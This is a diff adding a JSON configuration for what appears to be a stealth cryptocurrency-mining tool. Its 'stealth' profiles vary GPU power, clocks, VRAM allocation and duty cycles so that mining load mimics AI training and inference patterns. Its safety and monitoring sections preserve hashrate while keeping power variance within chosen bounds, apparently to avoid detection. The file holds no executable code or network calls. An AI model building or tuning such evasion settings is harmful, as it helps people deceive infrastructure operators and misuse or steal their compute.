@@ -1,0 +1,102 @@
+{
+  "profiles": {
+    "light": {
+      "name": "Light Stealth Mode",
+      "description": "Minimal overhead with basic AI-like variations",
+      "overhead_target": 0.05,
+      "power_variation": 0.08,
+      "vram_allocation": 0.35,
+      "jitter_factor": 0.15,
+      "cycle_duration": 60,
+      "pattern_type": "sinusoidal"
+    },
+    "medium": {
+      "name": "Balanced Mode",
+      "description": "Balanced between stealth and performance",
+      "overhead_target": 0.12,
+      "power_variation": 0.12,
+      "vram_allocation": 0.50,
+      "jitter_factor": 0.25,
+      "cycle_duration": 90,
+      "pattern_type": "adaptive"
+    },
+    "heavy": {
+      "name": "Maximum Stealth",
+      "description": "Maximum AI-like behavior with higher overhead",
+      "overhead_target": 0.20,
+      "power_variation": 0.18,
+      "vram_allocation": 0.70,
+      "jitter_factor": 0.30,
+      "cycle_duration": 120,
+      "pattern_type": "complex"
+    }
+  },
+  "safety": {
+    "max_temperature": 78,
+    "min_hashrate_retention": 0.85,
+    "power_stddev_target": 5,
+    "emergency_scale_factor": 0.7,
+    "temperature_check_interval": 5,
+    "thermal_throttle_threshold": 75
+  },
+  "patterns": {
+    "training": {
+      "type": "sinusoidal",
+      "frequency": 0.1,
+      "phase_shift_enabled": true,
+      "amplitude_variation": 0.15,
+      "base_duty_cycle": 0.85
+    },
+    "inference": {
+      "type": "burst",
+      "burst_duration_ms": 100,
+      "idle_duration_ms": 200,
+      "burst_intensity": 0.95,
+      "idle_intensity": 0.60
+    },
+    "adaptive": {
+      "type": "mixed",
+      "training_weight": 0.6,
+      "inference_weight": 0.4,
+      "transition_smoothness": 0.8
+    }
+  },
+  "hardware_control": {
+    "nvml": {
+      "enabled": true,
+      "power_limit_step": 5,
+      "clock_step": 50,
+      "smooth_transition": true,
+      "transition_delay_ms": 100
+    },
+    "compute_fallback": {
+      "enabled": true,
+      "kernel_size": 2048,
+      "duty_cycle_resolution": 0.05,
+      "parallel_kernels": 2
+    },
+    "vram": {
+      "allocation_strategy": "rotating",
+      "rotation_interval_s": 60,
+      "allocation_chunks": 3,
+      "chunk_size_variation": 0.2
+    }
+  },
+  "monitoring": {
+    "metrics_interval_s": 30,
+    "stddev_window_size": 60,
+    "alert_thresholds": {
+      "temperature_warning": 75,
+      "temperature_critical": 80,
+      "power_stddev_min": 3,
+      "power_stddev_max": 8,
+      "hashrate_drop_percent": 15
+    },
+    "logging": {
+      "level": "INFO",
+      "file_rotation": true,
+      "max_file_size_mb": 100,
+      "max_files": 5
+    }
+  }
+}
